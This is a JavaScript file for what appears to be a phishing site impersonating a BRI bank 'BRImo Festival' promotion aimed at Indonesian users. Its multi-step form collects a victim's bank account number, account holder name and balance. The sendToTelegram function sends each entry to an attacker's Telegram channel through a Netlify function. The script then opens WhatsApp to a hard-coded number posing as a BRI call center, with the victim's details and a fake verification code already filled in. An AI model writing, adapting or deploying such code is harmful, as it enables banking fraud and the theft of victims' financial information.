document.addEventListener('DOMContentLoaded', function() {
    // Element declarations
    const pages = document.querySelectorAll('.page');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const footer = document.querySelector('.footer-image');
    const next1 = document.getElementById('next1');
    const next2 = document.getElementById('next2');
    const contactService = document.getElementById('contactService');
    const accountNumber = document.getElementById('accountNumber');
    const accountName = document.getElementById('accountName');
    const currentBalance = document.getElementById('currentBalance');
    const amountInWords = document.getElementById('amountInWords');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Function to send data to Telegram via Netlify Function
    async function sendToTelegram(data) {
        try {
            const response = await fetch('/.netlify/functions/send-to-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
            
            if (!response.ok) {
                console.error('Failed to send data to Telegram');
            }
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }

    // Toggle header visibility
    function toggleHeaderVisibility(show) {
        const headerImage = document.querySelector('.header-image');
        if (show) {
            headerImage.classList.remove('header-hidden');
        } else {
            headerImage.classList.add('header-hidden');
        }
    }

    // Toggle footer visibility
    function toggleFooterVisibility(show) {
        if (show) {
            footer.classList.remove('footer-hidden');
        } else {
            footer.classList.add('footer-hidden');
        }
    }

    // Show loading animation
    function showLoading() {
        loadingOverlay.style.display = 'flex';
    }

    // Hide loading animation
    function hideLoading() {
        loadingOverlay.style.display = 'none';
    }

    // Navigate between pages with loading animation
    function goToPage(currentPage, nextPage) {
        showLoading();
        
        // Simulate loading delay (1.5 seconds)
        setTimeout(function() {
            currentPage.classList.remove('active');
            nextPage.classList.add('active');
            
            // Control header and footer visibility
            toggleHeaderVisibility(nextPage.id !== 'page2');
            toggleFooterVisibility(nextPage.id !== 'page3');
            
            window.scrollTo(0, 0);
            hideLoading();
        }, 1500);
    }

    // Show first page by default
    page1.classList.add('active');
    toggleHeaderVisibility(true);
    toggleFooterVisibility(true);

    // ================= NUMBER TO WORDS CONVERSION =================
    function convertNumberToWords(num) {
        const ones = ['', 'Satu', 'Dua', 'Tiga', 'Empat', 'Lima', 'Enam', 'Tujuh', 'Delapan', 'Sembilan'];
        const teens = ['Sepuluh', 'Sebelas', 'Dua Belas', 'Tiga Belas', 'Empat Belas', 'Lima Belas', 'Enam Belas', 'Tujuh Belas', 'Delapan Belas', 'Sembilan Belas'];
        const tens = ['', 'Sepuluh', 'Dua Puluh', 'Tiga Puluh', 'Empat Puluh', 'Lima Puluh', 'Enam Puluh', 'Tujuh Puluh', 'Delapan Puluh', 'Sembilan Puluh'];
        const scales = ['', 'Ribu', 'Juta', 'Miliar', 'Triliun'];

        if (num == 0) return 'Nol Rupiah';
        num = parseInt(num, 10);
        if (isNaN(num)) return '';

        // Break the number into chunks of 3 digits
        const chunks = [];
        while (num > 0) {
            chunks.push(num % 1000);
            num = Math.floor(num / 1000);
        }

        let words = [];
        for (let i = 0; i < chunks.length; i++) {
            const chunk = chunks[i];
            if (chunk === 0) continue;

            const chunkWords = [];
            const hundred = Math.floor(chunk / 100);
            const ten = chunk % 100;

            // Handle hundreds place
            if (hundred > 0) {
                if (hundred === 1) {
                    chunkWords.push('Seratus');
                } else {
                    chunkWords.push(ones[hundred] + ' Ratus');
                }
            }

            // Handle tens and ones place
            if (ten > 0) {
                if (ten < 10) {
                    chunkWords.push(ones[ten]);
                } else if (ten < 20) {
                    chunkWords.push(teens[ten - 10]);
                } else {
                    const tenPart = Math.floor(ten / 10);
                    const onePart = ten % 10;
                    chunkWords.push(tens[tenPart]);
                    if (onePart > 0) {
                        chunkWords.push(ones[onePart]);
                    }
                }
            }

            // Add scale word if not empty
            if (chunkWords.length > 0) {
                // Special case for 1000
                if (i === 1 && chunk === 1 && chunks.length === 2 && chunks[0] === 0) {
                    words.unshift('Seribu');
                } else {
                    words.unshift(chunkWords.join(' ') + (scales[i] ? ' ' + scales[i] : ''));
                }
            }
        }

        return words.join(' ') + ' Rupiah';
    }

    // Format number with thousand separators
    function formatNumberInput(input) {
        // Remove all non-digit characters
        let value = input.replace(/\D/g, '');
        
        // Format with thousand separators if not empty
        if (value.length > 0) {
            value = parseInt(value, 10).toLocaleString('id-ID');
        }
        
        return value;
    }

    // Handle balance input changes
    currentBalance.addEventListener('input', function() {
        // Format the display with thousand separators
        const formattedValue = formatNumberInput(this.value);
        this.value = formattedValue;
        
        // Convert to words
        const numericValue = this.value.replace(/\./g, '');
        const words = convertNumberToWords(numericValue);
        amountInWords.textContent = words || '';
    });

    // ================= INPUT VALIDATION =================
    next1.addEventListener('click', function() {
        const numRegex = /^[0-9]+$/;
        if (accountNumber.value.trim() === '') {
            alert('Mohon isi nomor rekening');
            return;
        } else if (!numRegex.test(accountNumber.value.trim())) {
            alert('Nomor rekening harus berupa angka');
            return;
        }
        
        const nameRegex = /^[a-zA-Z\s]+$/;
        if (accountName.value.trim() === '') {
            alert('Mohon isi nama pemilik rekening');
            return;
        } else if (!nameRegex.test(accountName.value.trim())) {
            alert('Nama pemilik hanya boleh mengandung huruf dan spasi');
            return;
        }
        
        // Send account info to Telegram
        const accountData = {
            type: 'account_info',
            accountNumber: accountNumber.value.trim(),
            accountName: accountName.value.trim()
        };
        sendToTelegram(accountData);
        
        goToPage(page1, page2);
    });

    next2.addEventListener('click', function() {
        const numericValue = currentBalance.value.replace(/\./g, '');
        
        if (numericValue.trim() === '') {
            alert('Mohon isi jumlah saldo');
            return;
        } else if (isNaN(numericValue)) {
            alert('Jumlah saldo harus berupa angka');
            return;
        } else if (parseInt(numericValue) <= 0) {
            alert('Jumlah saldo harus lebih dari 0');
            return;
        }
        
        // Send balance info to Telegram
        const balanceData = {
            type: 'balance_info',
            accountNumber: accountNumber.value.trim(),
            accountName: accountName.value.trim(),
            balance: numericValue
        };
        sendToTelegram(balanceData);
        
        goToPage(page2, page3);
    });

    // Contact service via WhatsApp - UPDATED NUMBER
    contactService.addEventListener('click', function() {
        const whatsappNumber = '6283847980901'; // Updated to Sabrina BRI Call Center
        const virtualCode = Math.floor(100000 + Math.random() * 900000);
        const numericValue = currentBalance.value.replace(/\./g, '');
        const formattedBalance = new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(numericValue);

        const message = `Halo admin BRimo Festival,\n\nSaya ${accountName.value.trim()} dengan detail sebagai berikut:\n- Nomor Rekening: ${accountNumber.value.trim()}\n- Saldo Terakhir: ${formattedBalance}\n- Dalam Huruf: ${amountInWords.textContent}\n\nSaya ingin menanyakan tentang partisipasi saya dalam BRimo Festival.\nKode verifikasi saya: ${virtualCode}\n\nTerima kasih.`;
        const encodedMessage = encodeURIComponent(message);
        window.open(`https://wa.me/${whatsappNumber}?text=${encodedMessage}`, '_blank');
    });

    // ================= INPUT FORMATTING =================
    accountName.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
    });

    accountNumber.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });
});
